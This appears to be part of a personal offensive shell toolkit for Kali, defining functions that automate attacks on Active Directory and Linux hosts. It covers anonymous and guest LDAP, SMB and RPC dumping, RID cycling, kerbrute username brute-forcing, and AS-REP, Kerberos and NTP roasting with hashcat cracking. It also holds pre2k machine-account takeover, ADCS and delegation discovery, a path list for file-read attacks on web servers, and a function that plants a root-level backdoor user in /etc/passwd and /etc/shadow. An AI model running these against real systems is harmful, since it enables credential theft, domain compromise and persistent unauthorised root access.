        nxc ldap $1 -u $2 -H $3 --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "" | sed -E 's/^LDAP\s+\S+\s+\S+\s+\S+\s+//' | awk '/\\[\\+] Response for object:/ { if (p) print p; p="" } { p = p ? p"\n"$0 : $0 } END { print p }' | grep -v "msDS-SupportedEncryptionTypes\|lastLogonTimestamp\|dSCorePropagationData\|isCriticalSystemObject\|objectCategory\|servicePrincipalName\|sAMAccountType\|logonCount\|accountExpires\|objectSid\|primaryGroupID\|pwdLastSet\|localPolicyFlags\|lastLogon\|lastLogoff\|badPasswordTime\|countryCode\|codePage\|badPwdCount\|userAccountControl\|objectGUID\|name\|uSNChanged\|uSNCreated\|whenChanged\|whenCreated\|instanceType\|distinguishedName\|cn\|objectClass\|dNSHostName\|operatingSystem\|operatingSystemVersion\|logonHours\|displayName\|givenName\|msDFSR-ComputerReferenceBL\|msDS-GenerationId\|rIDSetReferences\|serverReferenceBL\|showInAdvancedViewOnly\|servicePrincipalName" | awk '/\\[\\+] Response for object:/ || NF >= 2' | grep -v ^CN= | sed 's/\[+] Response for object:/\n&/' > LDAP_USERS_PROPERTIES_$1.txt

        echo -e "\n[+] DOMAIN PASSWORD POLICY\n"
        nxc ldap $1 -u $2 -H $3 --query "(objectClass=domainDNS)" "minPwdLength lockoutThreshold" | tee -a LDAP_PASS_POL_$1.txt

        echo -e "\n[+] DOMAIN TRUST DATA\n"
        nxc ldap $1 -u $2 -H $3 --dc-list 

        echo -e "\n[+] GETTING MAQ\n"
        nxc ldap $1 -u $2 -H $3 -M maq

        echo -e "\n[+] DUMPING ADI-DNS ZONES\n"
        adidnsdump -u "$dom\\\\$2" -p ":$3" --print-zones $1 --dns-tcp -r

        echo -e "\n[+] ATTEMPTING PRE2K TAKEOVER\n"
        sudo rm /home/kali/.nxc/modules/pre2k/ccache/* && nxc ldap $1 -u $2 -H $3 -k -M pre2k && mkdir -p ../PRE2K_TGT && cp /home/kali/.nxc/modules/pre2k/ccache/* ../PRE2K_TGT && rmdir ../PRE2K_TGT 2>/dev/null
        ls -la ../PRE2K_TGT/*.ccache | awk '{print $9}' | awk -F"/" '{print $3}' | cut -d'.' -f1 > /tmp/pre2k && while read pc; do echo "${pc:u}.${dom}" | anew -q ../owned.txt; done < /tmp/pre2k

        cat LDAP_USERS_$1.txt | anew -q ../users.txt
        cd ..
        find ./LDAP_DATA -type f -empty -delete; rmdir ./LDAP_DATA 2>/dev/null

        if [[ ! -s LDAP_DATA/LDAP_USERS_$1.txt ]]; then
            echo -e "\n[+] GETTING SMB USERS\n"
            mkdir -p SMB_DATA && cd SMB_DATA
            nxc smb $1 -u $2 -H $3 --users-export SMB_USERS_$1.txt
            if [[ -s SMB_USERS_$1.txt ]]; then
                echo -e "\n[+] FOUND SMB USERS\n"
                cat SMB_USERS_$1.txt
                cat SMB_USERS_$1.txt | anew -q ../users.txt
            fi
            echo -e "\n[+] DOMAIN PASSWORD POLICY\n"
            nxc smb $1 -u $2 -H $3 --pass-pol
            cd ..
            find ./SMB_DATA -type f -empty -delete; rmdir ./SMB_DATA 2>/dev/null

            echo -e "\n[+] ATTEMPTING RID CYCLING\n"
            mkdir -p RID_CYCLE && cd RID_CYCLE
            dom=$(nxc ldap $1 | tr '(' '\n' | grep -i domain | awk -F":" '{print $2}' | tr -d ')')
            lookupsid.py $dom/$2@$1 -hashes ":$3" -dc-ip $1 -no-pass 10000 | grep SidTypeUser | awk -F'\\\\|\\(' '{print $2}' | tee -a RID_USERS_$1.txt

            protocols=("smb" "mssql")
            for protocol in "${protocols[@]}"; do
                nxc $protocol $1 -u $2 -H $3 --rid-brute 10000 | grep SidTypeUser | awk '{print $6}' | awk -F'\\\\|\\(' '{print $2}' | tee -a RID_USERS_$1.txt
            done
            cat RID_USERS_$1.txt | anew -q ../users.txt
            cd ..
            find ./RID_CYCLE -type f -empty -delete; rmdir ./RID_CYCLE 2>/dev/null
        fi

        echo -e "\n[+] SAVED UNIQUE USERNAMES FOUND IN \"users.txt\"\n"

        delegfind $1 $2 $3
        certfind $1 $2 $3
        nxcblood $1 $2 $3
        domroast $1 $2 $3
    fi
}

# CA Templates Enumeration
certfind(){
    echo -e "\n[+] SEARCHING VULNERABLE CA TEMPLATES FROM USER \"$2\"\n"
    if [[ -f $3 ]]; then
        kbload $3 >/dev/null
        dc_fqdn=$(cat /etc/hosts | grep -i $1 | awk '{print $2}' | head -n 1)
        nxc ldap $1 --use-kcache -M adcs
        nxc smb $1 --use-kcache -M enum_ca
        certipy-ad find -u $2 -k -dc-ip $1 -target $dc_fqdn -vulnerable -stdout -enabled -ldap-scheme ldap
    elif [[ -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
        nxc ldap $1 -u $2 -p $3 -M adcs
        nxc smb $1 -u $2 -p $3 -M enum_ca
        certipy-ad find -u $2 -p $3 -dc-ip $1 -vulnerable -stdout -enabled -ldap-scheme ldap
    elif [[ ! -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
        nxc ldap $1 -u $2 -H $3 -M adcs
        nxc smb $1 -u $2 -H $3  -M enum_ca
        certipy-ad find -u $2 -hashes $3 -dc-ip $1 -vulnerable -stdout -enabled -ldap-scheme ldap
    fi
}

# NXC Delegation Finder
delegfind(){
    echo -e "\n[+] SEARCHING DELEGATION PRIVILEGES\n"
    if [[ -f $3 ]]; then
        kbload $3 >/dev/null
        nxc ldap $1 --use-kcache --find-delegation
    elif [[ -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
        nxc ldap $1 -u $2 -p $3 --find-delegation
    elif [[ ! -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
        nxc ldap $1 -u $2 -H $3 --find-delegation
    fi
}


# AD Data Bruteforcer
dombrute(){
    echo -e "\n[+] ATTEMPTING BLIND RPC DUMPING\n"
    mkdir -p RPC_DATA && cd RPC_DATA
    rpcclient -U % -N $1 -c "querydispinfo" 2>/dev/null | tee -a RPC_USERS_DESCRIPTIONS_$1.txt
    rpcclient -U Guest% -N $1 -c "querydispinfo" 2>/dev/null | tee -a RPC_USERS_DESCRIPTIONS_$1.txt

    rpcclient -U % -N $1 -c "getdompwinfo" 2>/dev/null | tee -a RPC_PASS_POL_$1.txt
    rpcclient -U Guest% -N $1 -c "getdompwinfo" 2>/dev/null | tee -a RPC_PASS_POL_$1.txt

    rpcclient -U Guest% -N $1 -c "enumdomusers" 2>/dev/null | awk -F"[][]" '{print $2}' | tee -a RPC_USERS_$1.txt
    rpcclient -U Guest% -N $1 -c "enumdomusers" 2>/dev/null | awk -F"[][]" '{print $2}' | tee -a RPC_USERS_$1.txt

    rpcclient -U % -N $1 -c "enumprinters" 2>/dev/null | tee -a RPC_PRINTERS_$1.txt
    rpcclient -U Guest% -N $1 -c "enumprinters" 2>/dev/null | tee -a RPC_PRINTERS_$1.txt
    if [[ -s RPC_USERS_$1.txt ]]; then
        cat RPC_USERS_$1.txt | anew -q ../users.txt

        echo -e "\n[+] GETTING QUERYUSER DATA FOR ALL USERS\n"
        cd RPC_DATA
        while read user; do
            rpcclient -U % -N $1 -c "queryuser $user" 2>/dev/null | tee -a RPC_USERS_DATA_$1.txt
            rpcclient -U Guest% -N $1 -c "queryuser $user" 2>/dev/null | tee -a RPC_USERS_DATA_$1.txt
        done < ../users.txt
    fi
    cd ..
    find ./RPC_DATA -type f -empty -delete; rmdir ./RPC_DATA 2>/dev/null

    echo -e "\n[+] ATTEMPTING RID CYCLING\n"
    mkdir -p RID_CYCLE && cd RID_CYCLE
    dom=$(nxc ldap $1 | tr '(' '\n' | grep -i domain | awk -F":" '{print $2}' | tr -d ')')
    lookupsid.py $dom/@$1 -no-pass 10000 | grep SidTypeUser | awk -F'\\\\|\\(' '{print $2}' | tee -a RID_USERS_$1.txt
    lookupsid.py $dom/Guest:''@$1 -no-pass 10000 | grep SidTypeUser | awk -F'\\\\|\\(' '{print $2}' | tee -a RID_USERS_$1.txt

    protocols=("smb" "mssql")
    for protocol in "${protocols[@]}"; do
        nxc $protocol   $1 --rid-brute 10000 | grep SidTypeUser | awk '{print $6}' | awk -F'\\\\|\\(' '{print $2}' | tee -a RID_USERS_$1.txt
        nxc $protocol   $1 -u Guest -p '' --rid-brute 10000 | grep SidTypeUser | awk '{print $6}' | awk -F'\\\\|\\(' '{print $2}' | tee -a RID_USERS_$1.txt
    done
    cat RID_USERS_$1.txt | anew -q ../users.txt
    cd ..
    find ./RID_CYCLE -type f -empty -delete; rmdir ./RID_CYCLE 2>/dev/null

    echo -e "\n[+] ATTEMPTING LDAP ANONYMOUS DUMPING\n"
    mkdir -p LDAP_DATA && cd LDAP_DATA
    nxc ldap $1 -u '' -p '' --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "samaccountname" | grep -i samaccountname | awk '{print $6}' | tee -a LDAP_USERS_$1.txt
    nxc ldap $1 -u '' -p '' --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "" | sed -E 's/^LDAP\s+\S+\s+\S+\s+\S+\s+//' | awk '/\\[\\+] Response for object:/ { if (p) print p; p="" } { p = p ? p"\n"$0 : $0 } END { print p }' | grep -v "msDS-SupportedEncryptionTypes\|lastLogonTimestamp\|dSCorePropagationData\|isCriticalSystemObject\|objectCategory\|servicePrincipalName\|sAMAccountType\|logonCount\|accountExpires\|objectSid\|primaryGroupID\|pwdLastSet\|localPolicyFlags\|lastLogon\|lastLogoff\|badPasswordTime\|countryCode\|codePage\|badPwdCount\|userAccountControl\|objectGUID\|name\|uSNChanged\|uSNCreated\|whenChanged\|whenCreated\|instanceType\|distinguishedName\|cn\|objectClass\|dNSHostName\|operatingSystem\|operatingSystemVersion\|logonHours\|displayName\|givenName\|msDFSR-ComputerReferenceBL\|msDS-GenerationId\|rIDSetReferences\|serverReferenceBL\|showInAdvancedViewOnly\|servicePrincipalName" | awk '/\\[\\+] Response for object:/ || NF >= 2' | grep -v ^CN= | sed 's/\[+] Response for object:/\n&/' > LDAP_USER_PROPERTIES_$1.txt

    echo -e "\n[+] DOMAIN PASSWORD POLICY\n"
    nxc ldap $1 -u '' -p '' --query "(objectClass=domainDNS)" "minPwdLength lockoutThreshold" | tee -a LDAP_PASS_POL_$1.txt

    echo -e "\n[+] DOMAIN TRUST DATA\n"
    nxc ldap $1 -u '' -p '' --dc-list --get-sid
    cat LDAP_USERS_$1.txt | anew -q ../users.txt

    if [[ ! -s LDAP_USERS_$1.txt ]]; then
        echo -e "\n[+] ATTEMPTING SMB DUMPING\n"
        cd .. && mkdir -p SMB_DATA && cd SMB_DATA
        nxc smb $1 -u '' -p '' --users-export ANON_SMB_USERS_$1.txt
        nxc smb $1 -u Guest -p '' --users-export GUEST_SMB_USERS_$1.txt
        cat ANON_SMB_USERS_$1.txt GUEST_SMB_USERS_$1.txt | sort -u | anew -q SMB_USERS_$1.txt && rm ANON_SMB_USERS_$1.txt GUEST_SMB_USERS_$1.txt
        if [[ -s SMB_USERS_$1.txt ]]; then
            echo -e "\n[+] FOUND SMB USERS\n"
            cat SMB_USERS_$1.txt
            cat SMB_USERS_$1.txt | anew -q ../users.txt
        fi

        echo -e "\n[+] DOMAIN PASSWORD POLICY\n"
        nxc smb $1 -u Guest -p '' --pass-pol
        nxc smb $1 -u '' -p '' --pass-pol

        cd ..
        find ./SMB_DATA -type f -empty -delete; rmdir ./SMB_DATA 2>/dev/null
    fi

    echo -e "\n[+] ATTEMPTING USER BRUTEFORCING\n"
    dom=$(cat /etc/hosts | grep -i $1 | awk '{print $3}' | head -n 1)
    kerbrute userenum -t 40 -d $dom --dc $1 $2 | grep -i + | awk '{print $7}' | awk -F"@" '{print $1}' | tee -a LDAP_BRUTE_$1.txt
    cat LDAP_BRUTE_$1.txt | anew -q ../users.txt
    cd ..
    find ./LDAP_DATA -type f -empty -delete; rmdir ./LDAP_DATA 2>/dev/null

    echo -e "\n[+] ATTEMPTING PRE2K TAKEOVER\n"
    mkdir -p PRE2K_TGT && cd PRE2K_TGT
    cat ../users.txt | grep -i '$$' | anew -q pc_accounts.txt
    pre2k $1 pc_accounts.txt
    cd ..
    find ./PRE2K_TGT -type f -empty -delete; rmdir ./PRE2K_TGT 2>/dev/null

    echo -e "\n[+] SAVING UNIQUE USERS IN \"users.txt\"\n"
    domroast $1 users.txt
}

# Full KB Roasting
domroast(){
    mkdir -p ROASTING_HASHES && cd ROASTING_HASHES
    if [[ -z $3 ]]; then
        mkdir -p ASREP && cd ASREP
        asreproast $1 $2
        if [[ -s asrep_cracked.txt ]]; then
            cat asrep_cracked.txt
            echo -e "\n[+] SAVING ALL FOUND PASSWORDS IN \"pass.txt\"\n"
            cat *_cracked.txt | awk -F":" '{print $2}' | anew -q ../../pass.txt
            mv asrep_cracked.txt ..
        fi
    else
        mkdir -p ASREP && cd ASREP
        asreproast $1 $2 $3
        if [[ -s asrep_cracked.txt ]]; then
            cat asrep_cracked.txt
            echo -e "\n[+] SAVING ALL FOUND PASSWORDS IN \"pass.txt\"\n"
            cat *_cracked.txt | awk -F":" '{print $2}' | anew -q ../../pass.txt
            mv asrep_cracked.txt ..
        fi
        cd ..

        mkdir -p KBR && cd KBR
        kbroast $1 $2 $3
        if [[ -s kb_cracked.txt ]]; then
            cat kb_cracked.txt
            echo -e "\n[+] SAVING ALL FOUND PASSWORDS IN \"pass.txt\"\n"
            cat *_cracked.txt | awk -F":" '{print $2}' | anew -q ../../pass.txt
            mv kb_cracked.txt ..
        fi
        cd ..
    fi
    mkdir -p NTP && cd NTP
    timeroast $1
    if [[ -s ntp_cracked.txt ]]; then
       cat ntp_cracked.txt
       echo -e "\n[+] SAVING ALL UNIQUE PASSWORDS FOUND IN \"pass.txt\"\n"
       cat *_cracked.txt | awk -F":" '{print $2}' | anew -q ../../pass.txt

       mv ntp_cracked.txt ..
    fi
    cd ../..
}


# Timeroasting Wrapper
timeroast(){
    echo -e "\n[+] CRACKING NTP HASHES USING \"/usr/share/wordlists/rockyou.txt\"\n"
    nxc smb $1 -M timeroast | grep sntp-ms | awk '{print $5}' | awk -F":" '{print $2}' > NTP_RAW_$1.txt
    if [[ -s NTP_RAW_$1.txt ]]; then
        ~/tools/HASHCAT/hashcat-7.1.2/hashcat.bin NTP_RAW_$1.txt -m 31300 -a 0 -O -w 4 --quiet /usr/share/wordlists/rockyou.txt --outfile ntp_cracked.txt
    fi
}

# KB Roasting wrapper
kbroast(){
    echo -e "\n[+] SEARCHING USERS TO KERBEROAST\n"
    dc_fqdn=$(cat /etc/hosts | grep -i $1 | awk '{print $2}' | head -n 1)
    if [[ -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
        nxc ldap $1 -u $2 -p $3 --kerberoasting KB_RAW_$1.txt -k --kdcHost $dc_fqdn | grep -i samaccountname | awk '{print $7}' | tr -d ','
    else
        nxc ldap $1 -u $2 -H $3 --kerberoasting KB_RAW_$1.txt -k --kdcHost $dc_fqdn | grep -i samaccountname | awk '{print $7}' | tr -d ','
    fi
    if [[ -s KB_RAW_$1.txt ]]; then
        echo -e "\n[+] CRAKING KB HASHES USING \"/usr/share/wordlists/rockyou.txt\"\n"
        ~/tools/HASHCAT/hashcat-7.1.2/hashcat.bin -m 13100 KB_RAW_$1.txt -a 0 -O -w 4 /usr/share/wordlists/rockyou.txt --quiet --outfile kb_cracked.txt
    fi
}

asreproast(){
    echo -e "\n[+] SEARCHING USERS TO ASREPROAST\n"
    dc_fqdn=$(cat /etc/hosts | grep -i $1 | awk '{print $2}' | head -n 1)
    if [[ -z $3 ]]; then
        asrep=$(nxc ldap $1 -u $2 -p '' --asreproast ASREP_RAW_$1.txt -k --kdcHost $dc_fqdn | grep -i samaccountname | awk '{print $7}' | tr -d ',')
    else
        if [[ -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
            asrep=$(nxc ldap $1 -u $2 -p $3 --asreproast ASREP_RAW_$1.txt -k --kdcHost $dc_fqdn | grep -i samaccountname | awk '{print $7}' | tr -d ',')
        else
            asrep=$(nxc ldap $1 -u $2 -H $3 --asreproast ASREP_RAW_$1.txt -k --kdcHost $dc_fqdn | grep -i samaccountname | awk '{print $7}' | tr -d ',')
        fi
    fi
    echo $asrep

    if [[ -s ASREP_RAW_$1.txt ]]; then
        echo -e "\n[+] CRAKING ASREP HASHES USING \"/usr/share/wordlists/rockyou.txt\"\n"
        ~/tools/HASHCAT/hashcat-7.1.2/hashcat.bin -m 18200 -a 0 -O -w 4 /usr/share/wordlists/rockyou.txt --outfile asrep_cracked.txt

        echo -e "\n[+] SEARCHING BLIND KB ROASTING USERS\n"
        if [[ -z $3 ]]; then
            blind_kb=$(nxc ldap $1 -u $(echo $asrep | head -n 1) -p '' --no-preauth-targets $2 --kerberoasting BLIND_KB_RAW_$1.txt -k --kdcHost $dc_fqdn | grep -i samaccountname | awk '{print $7}' | tr -d ',')
        else
            if [[ -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
                nxc ldap $1 -u $2 -p $3 --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "samaccountname" | grep -i samaccountname | awk '{print $6}' > all_users_$1.txt
            else
                nxc ldap $1 -u $2 -p $3 --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "samaccountname" | grep -i samaccountname | awk '{print $6}' > all_users_$1.txt
            fi
            blind_kb=$(nxc ldap $1 -u $(echo $asrep | head -n 1) -p '' --no-preauth-targets all_users_$1.txt --kerberoasting BLIND_KB_RAW_$1.txt -k --kdcHost $dc_fqdn | grep -i samaccountname | awk '{print $7}' | tr -d ',')
        fi
        echo $blind_kb

        if [[ -s BLIND_KB_RAW_$1.txt ]]; then
            echo -e "\n[+] CRACKING BLIND KB HASHES USING \"/usr/share/wordlists/rockyou.txt\"\n"
            ~/tools/HASHCAT/hashcat-7.1.2/hashcat.bin BLIND_KB_RAW_$1.txt -m 13100 -a 0 -O -w 4 /usr/share/wordlists/rockyou.txt --oufile blind_kb_cracked.txt
        fi
    fi
}

kbload(){
    echo -e "\n[+] LOADED TICKET \"$1\"\n"
    export KRB5CCNAME=$1
    klist
}

generate_web_paths() {
    if [[ $# -eq 0 ]]; then
        echo "Usage: generate_web_paths <server_type> [domain] [output_file]"
        echo "Supported servers: apache, nginx, lighttpd, tomcat, iis, caddy, all"
        return 1
    fi
    
    local server_type="$1"
    local domain="${2:-}"
    local output_file="${3:-web_paths.txt}"
    
    # Clear or create the output file
    > "$output_file"
    
    # Base directories
    local bases=("/usr/local/etc" "/etc" "/opt" "/usr/local")
    
    case "$server_type" in
        apache)
            {
            local apache_dirs=("httpd" "apache" "apache2" "apache24")
            local main_configs=("httpd.conf" "apache2.conf" "ports.conf")
            local site_configs=("000-default.conf" "default.conf" "default-ssl.conf")
            
            # Add domain-specific configs if domain provided
            if [[ -n "$domain" ]]; then
                site_configs+=("${domain}.conf" "ssl-${domain}.conf" "${domain}-ssl.conf" "vhost-${domain}.conf")
            fi
            
            for base in "${bases[@]}"; do
                for apache_dir in "${apache_dirs[@]}"; do
                    # Main configuration files
                    for config in "${main_configs[@]}"; do
                        echo "${base}/${apache_dir}/conf/${config}"
                        echo "${base}/${apache_dir}/${config}"
                    done
                    
                    # Virtual host directories
                    echo "${base}/${apache_dir}/conf/vhosts/"
                    echo "${base}/${apache_dir}/conf/vhosts.d/"
                    echo "${base}/${apache_dir}/conf/extra/"
                    echo "${base}/${apache_dir}/conf/extra/httpd-vhosts.conf"
                    echo "${base}/${apache_dir}/vhosts/"
                    
                    # Sites configurations
                    for site_config in "${site_configs[@]}"; do
                        echo "${base}/${apache_dir}/conf/sites-enabled/${site_config}"
                        echo "${base}/${apache_dir}/conf/sites-available/${site_config}"
                        echo "${base}/${apache_dir}/sites-enabled/${site_config}"
                        echo "${base}/${apache_dir}/sites-available/${site_config}"
                    done
                    
                    # Log files (only if domain provided for targeted approach)
                    if [[ -n "$domain" ]]; then
                        echo "${base}/${apache_dir}/logs/access_log"
                        echo "${base}/${apache_dir}/logs/error_log"
                        echo "/var/log/${apache_dir}/access.log"
                        echo "/var/log/${apache_dir}/error.log"
                    fi
                done
            done
            
            # Common Apache paths
            echo "/var/www/html/"
            if [[ -n "$domain" ]]; then
                echo "/var/www/${domain}/"
                echo "/home/*/public_html/${domain}/"
            else
                echo "/var/www/"
            fi
            echo "/srv/http/"
            echo "/home/*/public_html/"
            } >> "$output_file"
            ;;
        
        nginx)
            {
            local main_configs=("nginx.conf")
            local site_configs=("default" "default.conf" "default_ssl")
            
            # Add domain-specific configs if domain provided
            if [[ -n "$domain" ]]; then
                site_configs+=("${domain}" "${domain}.conf" "ssl-${domain}.conf" "${domain}-le-ssl.conf")
            fi
            
            for base in "${bases[@]}"; do
                # Main configuration files
                for config in "${main_configs[@]}"; do
                    echo "${base}/nginx/${config}"
                    echo "${base}/nginx/conf/${config}"
                done
                
                # Configuration directories
                echo "${base}/nginx/conf.d/"
                echo "${base}/nginx/vhosts/"
                
                # Sites configurations
                for site_config in "${site_configs[@]}"; do
                    echo "${base}/nginx/sites-enabled/${site_config}"
                    echo "${base}/nginx/sites-available/${site_config}"
                    echo "${base}/nginx/conf.d/${site_config}"
                    echo "${base}/nginx/vhosts/${site_config}"
                done
            done
            
            # Additional common Nginx paths
            echo "/opt/nginx/conf/nginx.conf"
            echo "/opt/nginx/conf.d/"
            if [[ -n "$domain" ]]; then
                echo "/var/log/nginx/${domain}.access.log"
                echo "/var/log/nginx/${domain}.error.log"
                echo "/var/www/${domain}/"
            else
                echo "/var/log/nginx/access.log"
                echo "/var/log/nginx/error.log"
            fi
            echo "/usr/share/nginx/html/"
            echo "/srv/http/"
            } >> "$output_file"
            ;;
        
        lighttpd)
            {
            local lighttpd_configs=("lighttpd.conf")
            local vhost_configs=("simple-vhost.conf" "evhost.conf")
            
            # Add domain-specific configs if domain provided
            if [[ -n "$domain" ]]; then
                vhost_configs+=("${domain}.conf")
            fi
            
            for base in "${bases[@]}"; do
                for config in "${lighttpd_configs[@]}"; do
                    echo "${base}/lighttpd/${config}"
                    echo "${base}/lighttpd/conf-available/${config}"
                done
                
                # Vhost configurations
                for vhost_config in "${vhost_configs[@]}"; do
                    echo "${base}/lighttpd/conf-available/${vhost_config}"
                    echo "${base}/lighttpd/conf-enabled/${vhost_config}"
                    echo "${base}/lighttpd/vhosts/${vhost_config}"
                done
                
                echo "${base}/lighttpd/vhosts.d/"
            done
            
            # Common Lighttpd paths
            if [[ -n "$domain" ]]; then
                echo "/var/log/lighttpd/${domain}.access.log"
                echo "/var/www/${domain}/"
            else
                echo "/var/log/lighttpd/access.log"
                echo "/var/www/"
            fi
            echo "/srv/http/"
            } >> "$output_file"
            ;;
        
        tomcat)
            {
            local tomcat_dirs=("tomcat" "tomcat9" "tomcat8" "tomcat7" "tomcat85")
            local tomcat_configs=("server.xml" "web.xml" "context.xml")
            
            for base in "${bases[@]}"; do
                for tomcat_dir in "${tomcat_dirs[@]}"; do
                    for config in "${tomcat_configs[@]}"; do
                        echo "${base}/${tomcat_dir}/${config}"
                        echo "${base}/${tomcat_dir}/conf/${config}"
                    done
                    
                    # Virtual host and app directories
                    echo "${base}/${tomcat_dir}/conf/Catalina/"
                    echo "${base}/${tomcat_dir}/conf/Catalina/localhost/"
                    echo "${base}/${tomcat_dir}/webapps/"
                    
                    # Domain-specific if provided
                    if [[ -n "$domain" ]]; then
                        echo "${base}/${tomcat_dir}/conf/Catalina/localhost/${domain}.xml"
                        echo "${base}/${tomcat_dir}/webapps/${domain}/"
                        echo "${base}/${tomcat_dir}/webapps/${domain}/WEB-INF/web.xml"
                        echo "${base}/${tomcat_dir}/logs/${domain}.log"
                    else
                        echo "${base}/${tomcat_dir}/conf/Catalina/localhost/"
                        echo "${base}/${tomcat_dir}/webapps/"
                    fi
                done
            done
            
            # Common Tomcat paths
            echo "/opt/tomcat/conf/server.xml"
            if [[ -n "$domain" ]]; then
                echo "/var/log/tomcat*/${domain}.log"
            else
                echo "/var/log/tomcat*/catalina.out"
            fi
            echo "/var/lib/tomcat*/webapps/"
            } >> "$output_file"
            ;;
        
        iis)
            {
            # Windows paths
            echo "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config"
            echo "C:\\Windows\\System32\\inetsrv\\config\\schema\\"
            echo "C:\\inetpub\\wwwroot\\web.config"
            echo "C:\\inetpub\\logs\\LogFiles\\"
            
            if [[ -n "$domain" ]]; then
                echo "C:\\inetpub\\vhosts\\${domain}\\"
                echo "C:\\inetpub\\vhosts\\${domain}\\web.config"
                echo "C:\\inetpub\\wwwroot\\${domain}\\"
                echo "C:\\inetpub\\wwwroot\\${domain}\\web.config"
                echo "C:\\inetpub\\logs\\LogFiles\\W3SVC*\\${domain}.log"
            else
                echo "C:\\inetpub\\vhosts\\"
                echo "C:\\inetpub\\wwwroot\\"
            fi
            
            # IIS Express
            echo "C:\\Users\\*\\Documents\\IISExpress\\config\\applicationhost.config"
            } >> "$output_file"
            ;;
        
        caddy)
            {
            local caddy_configs=("Caddyfile")
            
            if [[ -n "$domain" ]]; then
                caddy_configs+=("${domain}.conf" "${domain}.caddy")
            fi
            
            for base in "${bases[@]}"; do
                for config in "${caddy_configs[@]}"; do
                    echo "${base}/caddy/${config}"
                    echo "${base}/caddy/conf.d/${config}"
                    echo "${base}/caddy/sites-enabled/${config}"
                    echo "${base}/caddy/sites-available/${config}"
                done
                echo "${base}/caddy/vhosts/"
            done
            
            # Common Caddy paths
            echo "/opt/caddy/Caddyfile"
            echo "/home/caddy/Caddyfile"
            if [[ -n "$domain" ]]; then
                echo "/var/log/caddy/${domain}.log"
                echo "/var/www/${domain}/"
            else
                echo "/var/log/caddy/access.log"
            fi
            } >> "$output_file"
            ;;
        
        all)
            {
            # General web discovery paths (always included)
            echo "# General Web Server Discovery Paths"
            echo "/var/www/html/"
            echo "/var/www/"
            echo "/srv/http/"
            echo "/usr/share/nginx/html/"
            echo "/usr/local/www/"
            echo "/home/*/public_html/"
            echo "/home/*/www/"
            echo "/etc/httpd/"
            echo "/etc/apache2/"
            echo "/etc/nginx/"
            echo "/etc/lighttpd/"
            echo "/etc/tomcat*/"
            
            # Domain-specific additions
            if [[ -n "$domain" ]]; then
                echo "/var/www/${domain}/"
                echo "/home/*/public_html/${domain}/"
                echo "/var/log/apache2/${domain}.log"
                echo "/var/log/nginx/${domain}.log"
                echo "/etc/letsencrypt/live/${domain}/"
                echo "/etc/ssl/certs/${domain}.crt"
                echo "/etc/ssl/private/${domain}.key"
            else
                echo "/var/log/apache2/"
                echo "/var/log/nginx/"
                echo "/etc/letsencrypt/live/"
            fi
            } >> "$output_file"
            
            # Append paths from all servers
            local servers=("apache" "nginx" "lighttpd" "tomcat" "caddy")
            for server in "${servers[@]}"; do
                # Use a temporary file to avoid recursion issues
                local temp_file=$(mktemp)
                generate_web_paths "$server" "$domain" "$temp_file"
                cat "$temp_file" >> "$output_file"
                rm -f "$temp_file"
            done
            ;;
        
        *)
            echo "Error: Unsupported server type '$server_type'" >&2
            echo "Supported servers: apache, nginx, lighttpd, tomcat, iis, caddy, all" >&2
            return 1
            ;;
    esac
    
    local line_count=$(wc -l < "$output_file" 2>/dev/null || echo "0")
    echo "Generated $line_count paths in: $output_file"
}

# Mount nfs share
nfsmount(){
    if [[ -z "$1" ]]; then
        echo "Usage: nfsmount <IP> {<PORT>}"
    fi
    if [[ -z "$2" ]]; then
        sudo mkdir -p /mnt/$1$shr && sudo mount -t nfs -o nolock $1:$shr /mnt/$1$shr && sudo ls -la /mnt/$1$shr
    else
        sudo mkdir -p /mnt/$1$shr && sudo mount -t nfs -o nolock -o port=$2 $1:$shr /mnt/$1$shr && sudo ls -la /mnt/$1$shr
    fi
    echo -e "\nCOPYING CONTENT INTO \"$1_$(echo $shr | tr '/' '_')\"\n"
    sudo cp -r /mnt/$1$shr ./$1$(echo $shr | tr '/' '_')
    sudo chmod -R +r ./$1$(echo $shr | tr '/' '_')
    cd ./$1$(echo $shr | tr '/' '_')
}

# Add a user to /etc/passwd and /etc/shadow
shadow_upd() {
    local passwd_file="$1"
    local shadow_file="$2"
    local username="$3"
    local password="${4:-defaultpassword123}"  # Default password if not provided
    
    if [[ -z "$1" ]]; then
        echo "Usage: shadow_upd /etc/passwd /etc/shadow username {password}"
    fi
    # Generate password hash
    local salt=$(openssl rand -hex 4)
    local password_hash=$(openssl passwd -6 -salt "$salt" "$password")
    
    # Remove existing user from passwd if present
    grep -v "^${username}:" "$passwd_file" > "${passwd_file}.tmp" && mv "${passwd_file}.tmp" "$passwd_file"
    
    # Remove existing user from shadow if present  
    grep -v "^${username}:" "$shadow_file" > "${shadow_file}.tmp" && mv "${shadow_file}.tmp" "$shadow_file"
    
    # Add user to passwd (UID 0 = root)
    echo "${username}:${password_hash}:0:0:root:/root:/bin/bash" >> "$passwd_file"
    
    # Add user to shadow
    local days_since_epoch=$(( $(date +%s) / 86400 ))
    echo "${username}:${password_hash}:${days_since_epoch}:0:99999:7:::" >> "$shadow_file"
    
    echo "User '${username}' added/updated with root privileges"
    echo "Password: ${password}"
}
source ~/.scan.sh
